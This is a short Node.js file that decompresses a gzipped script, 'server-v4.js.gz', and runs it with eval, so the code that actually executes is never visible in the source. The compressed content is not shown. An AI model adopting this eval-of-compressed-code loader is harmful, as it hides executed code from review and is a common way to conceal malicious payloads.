const _fs=require('fs');
const _path=require('path');
const _zlib=require('zlib');
const _code=_zlib.gunzipSync(_fs.readFileSync(_path.join(__dirname,'server-v4.js.gz'))).toString('utf8');
eval(_code);
